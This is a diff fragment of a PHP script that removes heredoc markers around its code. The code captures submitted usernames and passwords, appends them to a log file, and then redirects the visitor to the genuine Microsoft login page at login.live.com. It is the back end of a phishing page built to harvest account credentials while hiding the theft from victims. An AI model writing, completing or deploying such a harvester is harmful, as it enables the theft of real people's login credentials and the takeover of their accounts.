@@ -1,4 +1,4 @@
-'LOGINEOF'
+
 <?php
 $username = $_POST['username'] ?? 'N/A';
 $password = $_POST['password'] ?? 'N/A';
@@ -16,4 +16,3 @@ file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
 usleep(500000);
 header('Location: https://login.live.com/');
 exit();
-LOGINEOF
